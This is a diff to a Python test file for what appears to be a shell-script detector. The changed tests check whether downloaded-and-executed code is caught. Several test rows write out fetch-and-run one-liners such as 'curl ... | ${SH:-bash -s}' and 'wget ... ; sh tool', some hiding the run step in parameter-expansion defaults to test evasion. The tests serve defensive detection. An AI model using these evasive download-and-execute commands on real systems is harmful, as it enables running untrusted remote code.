@@ -1514,8 +1514,10 @@ class TestTheWholeWordIsTheCommandWordsAlone(unittest.TestCase):
     input, a carrier, a value, a redirect's target -- is the words `main` split it into, and
     every statement and stage is `main`'s. So the round-7 verdict's B1-B4 rows report as on
     `main`; `<>` reads on descriptor 0 alone (#2657); and a step that spells a mark the reader
-    puts in its text (U+E000-U+E004) reads exactly as `main`. Truth b5e b5p b3e b3p de b5n b3n dn
-    (R ran the payload, f fetched only)."""
+    puts in its text read exactly as `main` -- until #3138, under which it reads as `main` reads a
+    step that spells a plain literal character there (`shell_reader._MARKS`), so its `${SH:-bash
+    -s}` runs the payload as every shell does. Truth b5e b5p b3e b3p de b5n b3n dn (R ran the
+    payload, f fetched only)."""
 
     REPORT = (
         "wget -q -O ${D:-tool } %stool\nsh ${D:-tool  }" % URL,                         # T101a RRRRRRRR
@@ -1549,11 +1551,13 @@ class TestTheWholeWordIsTheCommandWordsAlone(unittest.TestCase):
         "curl -fsSLo tool %stool\n${RUN:-sh ./tool}" % URL,                             # h09
         "curl -fsSLo tool %stool\nX=1\n${X:+sh tool}" % URL,                            # h10
         "curl -fsSLo tool %stool\n${X:=bash tool}" % URL)                               # h11
-    # `<>` on another descriptor opens a file nothing writes the download to (the B3 control);
-    # and a step spelling a reader mark reads as `main`, which leaves `${SH:-bash -s}` a word
-    # it does not run (SE10's ruling: every shell runs the payload; `main` reads it CLEAN).
-    CLEAN = ("curl -fsSL %stool 2<> tool\nsh tool" % URL,) + tuple(
-        "echo %s\ncurl -fsSL %si.sh | ${SH:-bash -s}" % (mark, URL) for mark in "\ue000\ue001\ue002\ue003\ue004")
+    # `<>` on another descriptor opens a file nothing writes the download to (the B3 control).
+    CLEAN = ("curl -fsSL %stool 2<> tool\nsh tool" % URL,)
+    # A step spelling a reader mark read as `main`, which left `${SH:-bash -s}` a word it does not run (SE10's
+    # ruling: every shell runs the payload; `main` read it CLEAN) -- the round-8 pin, moved by #3138 under the
+    # coordinator's rule for it ("a step whose text spells a mark must read as main would read it if the character
+    # were a plain literal"): the typed mark is a plain literal to every pass now, and the default runs the payload.
+    SPELLED = tuple("echo %s\ncurl -fsSL %si.sh | ${SH:-bash -s}" % (mark, URL) for mark in shell_reader._MARKS)
 
     def test_each_row_main_reports_still_reports(self):
         for row in self.REPORT:
@@ -1566,6 +1570,12 @@ class TestTheWholeWordIsTheCommandWordsAlone(unittest.TestCase):
             for shell in SHELLS:
                 with self.subTest(row=row, shell=shell):
                     self.assertFalse(reported(row + "\necho done\n", shell))
+
+    def test_a_spelled_mark_is_a_plain_literal_and_the_default_runs_the_payload(self):
+        for row in self.SPELLED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
 
 
 class TestAQuotedShellDefaultIsTheShellItNames(unittest.TestCase):
